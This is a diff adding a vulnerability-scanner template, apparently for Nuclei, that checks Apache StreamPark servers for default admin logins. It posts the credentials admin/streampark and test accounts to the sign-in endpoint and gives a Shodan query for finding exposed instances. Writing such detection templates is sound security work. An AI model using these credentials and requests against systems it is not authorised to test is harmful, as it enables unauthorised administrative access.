@@ -1,0 +1,46 @@
+id: apache-streampark-default-login
+
+info:
+  name: Apache Streampark - Default Login
+  author: icarot
+  severity: high
+  description: |
+    Apache Streampark server enables default admin credentials. An attacker can execute unauthorized operations.
+  reference:
+    - https://github.com/apache/streampark
+  classification:
+    cpe: cpe:2.3:a:apache:streampark:*:*:*:*:*:*:*
+  metadata:
+    max-request: 4
+    vendor: apache
+    product: streampark
+    shodan-query: title:"Apache StreamPark"
+  tags: apache,streampark,default-login,vuln
+
+http:
+  - raw:
+      - |
+        POST /passport/signin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+
+        password={{password}}&username={{username}}&loginType=PASSWORD
+
+    attack: pitchfork
+    payloads:
+      username:
+        - admin
+        - test1
+        - test2
+        - test3
+      password:
+        - streampark
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(content_type, "application/json")'
+          - 'contains_all(body, "userId\":", "username\":", "token\":", "expire\":")'
+        condition: and
+# digest: 480a00453043021f74868d6281ba69a6b6aa5c6e80510904ed382cce75c945d0afe2243d17d732022019fbcdca956402e887a421a1f1b73d7135fc1a157cf46ec89b4a2fa4e0e62ece:922c64590222798bb761d5b6d8e72950
